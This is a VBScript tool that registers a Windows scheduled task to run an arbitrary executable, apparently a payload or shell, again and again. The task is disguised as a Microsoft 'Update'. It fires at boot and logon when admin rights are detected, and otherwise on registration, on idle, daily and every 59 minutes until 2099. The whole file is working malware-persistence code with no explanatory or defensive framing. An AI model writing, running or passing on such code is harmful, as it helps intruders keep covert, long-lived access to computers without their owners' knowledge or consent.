Set objArgs = WScript.Arguments
Dim shellPath
Dim taskName
If objArgs.Count < 1 Then
    WScript.Echo "Example: cscript schtasks.vbs C:\1.exe taskName"
Else
    shellPath = objArgs(0)
	taskName = objArgs(1)
    Const TriggerTypeDaily = 1
	Const ActionTypeExec = 0
	Set service = CreateObject("Schedule.Service")
	Call service.Connect
	Dim rootFolder
	Set rootFolder = service.GetFolder("\")
	Dim taskDefinition
	Set taskDefinition = service.NewTask(0)
	Dim regInfo
	Set regInfo = taskDefinition.RegistrationInfo
	regInfo.Description = "Update"
	regInfo.Author = "Microsoft"

	' Set the task setting info for the Task Scheduler by
	' creating a TaskSettings object.
	Dim settings
	Set settings = taskDefinition.settings
	settings.Enabled = True
	settings.StartWhenAvailable = True
	settings.Hidden = False
	settings.DisallowStartIfOnBatteries = False


	Dim triggers
	Set triggers = taskDefinition.triggers

	Dim trigger
	'uac
	On Error Resume Next
	    CreateObject("WScript.Shell").RegRead ("HKEY_USERS\S-1-5-19\Environment\TEMP")
	    If Err.Number = 0 Then
	        IsAdmin = True
	    'WScript.Echo IsAdmin
	    Set trigger = triggers.Create(8)
	    Set trigger = triggers.Create(9)
	    Else
	        IsAdmin = False
	    'WScript.Echo IsAdmin
	    End If
	    Err.Clear
	    On Error GoTo 0
	Set trigger = triggers.Create(7)
	Set trigger = triggers.Create(6)
	Set trigger = triggers.Create(TriggerTypeDaily)
	Dim startTime, endTime

	Dim time

	time = DateAdd("n", 2, Now)
	Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
	Dim tTime, tDate

	cSecond = "0" & Second(time)
	cMinute = "0" & Minute(time)
	CHour = "0" & Hour(time)
	cDay = "0" & Day(time)
	cMonth = "0" & Month(time)
	cYear = Year(time)

	tTime = Right(CHour, 2) & ":" & Right(cMinute, 2) & ":" & Right(cSecond, 2)
	tDate = cYear & "-" & Right(cMonth, 2) & "-" & Right(cDay, 2)
	startTime = tDate & "T" & tTime

	endTime = "2099-05-02T10:52:02"
	trigger.StartBoundary = startTime
	trigger.EndBoundary = endTime
	trigger.ID = "TimeTriggerId"
	trigger.Enabled = True

	Dim repetitionPattern
	Set repetitionPattern = trigger.Repetition
	' repetitionPattern.Duration = "PT14M"
	repetitionPattern.Interval = "PT59M" '
	Dim Action
	Set Action = taskDefinition.Actions.Create(ActionTypeExec)
	Action.Path = shellPath
	Action.arguments = ""
	Dim objNet, LoginUser
	'Set objNet = WScript.CreateObject( "WScript.Network" )
	Set objNet = CreateObject("WScript.Network")
	LoginUser = objNet.UserName

	    If UCase(LoginUser) = "SYSTEM" Then
	    Else
	    LoginUser = Empty
	    End If
	
	
	Call rootFolder.RegisterTaskDefinition(taskName, taskDefinition, 6, LoginUser, , 3)

	Wscript.sleep 3000
	'---------------------------------------------------------
	' This sample enumerates through the tasks on the local computer and
	' displays their name and state.
	'---------------------------------------------------------
	Dim taskCollection
	Set taskCollection = rootFolder.GetTasks(0)

	Dim numberOfTasks
	numberOfTasks = taskCollection.Count

	If numberOfTasks = 0 Then 
	    Wscript.Echo "No tasks are registered."
	Else
	    WScript.Echo "Number of tasks registered: " & numberOfTasks
	    
	    Dim registeredTask
	    For Each registeredTask In taskCollection
	        WScript.Echo "Task Name: " & registeredTask.Name
	    
	        Dim taskState 
	        Select Case registeredTask.State 
	            Case "0"
	                taskState = "Unknown"
	            Case "1"
	                taskState = "Disabled"
	            Case "2"
	                taskState = "Queued"
	            Case "3"
	                taskState = "Ready"
	            Case "4"
	                taskState = "Running"
	        End Select

	        WScript.Echo "    Task State: " & taskState
	    Next
	End If
End If